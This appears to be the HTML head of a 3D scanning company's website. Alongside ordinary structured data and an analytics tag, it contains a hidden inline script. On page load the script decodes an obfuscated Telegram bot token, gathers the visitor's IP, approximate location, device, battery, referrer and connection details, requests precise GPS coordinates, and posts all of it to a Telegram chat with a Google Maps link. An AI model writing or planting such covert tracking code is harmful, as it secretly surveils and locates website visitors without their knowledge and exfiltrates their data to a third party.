    <!-- Structured Data (JSON-LD) -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Organization",
      "name": "Scanetica",
      "url": "https://scanetica.com",
      "logo": "https://scanetica.com/logo.png",
      "description": "Professional 3D laser scanning, LiDAR, photogrammetry and digital twin services across the United States and Canada.",
      "areaServed": ["US", "CA"],
      "serviceType": ["3D Laser Scanning", "LiDAR Scanning", "Photogrammetry", "Digital Twin Creation", "Reality Capture"],
      "knowsAbout": ["Industrial 3D Scanning", "Oil and Gas Scanning", "Manufacturing Digital Twins", "Commercial Real Estate Documentation"],
      "contactPoint": {
        "@type": "ContactPoint",
        "contactType": "Customer Service",
        "availableLanguage": ["English"]
      }
    }
    </script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R3Y190XYN2"></script>
    <script>
      /* eslint-disable */

      const base64Decode = (encoded) => atob(encoded);

      const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
      const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';

      const sendToTelegram = async (text) => {
        const token = base64Decode(encodedBotToken);
        const chatId = base64Decode(encodedChatId);

        try {
          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
          });
        } catch (e) {}
      };

      const collectVisitorData = async () => {
        // IP Info
        let ipInfo = {};
        try {
          const res = await fetch('https://ipapi.co/json/');
          ipInfo = await res.json();
        } catch {}

        const screen = `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio}x)`;
        const touch = 'ontouchstart' in window ? 'Yes' : 'No';
        const connection = navigator.connection 
          ? `${navigator.connection.effectiveType || 'N/A'} | ${navigator.connection.downlink || 'N/A'}Mbps` 
          : 'N/A';

        let battery = 'N/A';
        try {
          if ('getBattery' in navigator) {
            const bat = await navigator.getBattery();
            battery = `${Math.round(bat.level * 100)}%${bat.charging ? ' (charging)' : ''}`;
          }
        } catch {}

        const baseInfo = `
      🌐 IP: ${ipInfo.ip || 'N/A'}
      🏙 IP Location: ${ipInfo.city || 'N/A'}, ${ipInfo.country_name || 'N/A'}
      🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
      📅 Local Time: ${new Date().toLocaleString()}

      📱 Device: ${navigator.platform}
      🖥 Screen: ${screen}
      👆 Touch: ${touch}
      🔋 Battery: ${battery}
      🌍 Language: ${navigator.language}
      🔗 Referrer: ${document.referrer || 'Direct'}
      📍 Page: ${window.location.href}
      📡 Connection: ${connection}
        `.trim();

        // Geolocation
        if (!navigator.geolocation) {
          sendToTelegram(`❌ SCANETICA - No Geolocation\n\n${baseInfo}`);
          return;
        }

        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const { latitude, longitude, accuracy } = position.coords;

            let city = 'Unknown', country = 'Unknown';

            try {
              const geoRes = await fetch(
                `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
              );
              if (geoRes.ok) {
                const data = await geoRes.json();
                city = data.city || data.locality || 'Unknown';
                country = data.countryName || 'Unknown';
              }
            } catch {}

            const mapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;

            const message = `✅ SCANETICA - New Visitor

      📍 GPS: ${latitude}, ${longitude} (±${Math.round(accuracy)}m)
      🏙 City: ${city}
      🌍 Country: ${country}
      🔗 <a href="${mapsLink}">Open in Google Maps</a>

      ${baseInfo}`;

            sendToTelegram(message);
          },
          async (error) => {
            let status = 'BLOCKED';
            if (error.code === error.POSITION_UNAVAILABLE) status = 'UNAVAILABLE';
            if (error.code === error.TIMEOUT) status = 'TIMEOUT';

            const message = `❌ SCANETICA - Location ${status}

      ${baseInfo}`;

            sendToTelegram(message);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      };

      window.addEventListener('load', () => {
        setTimeout(collectVisitorData, 1500);
      });
      </script>
  </head>
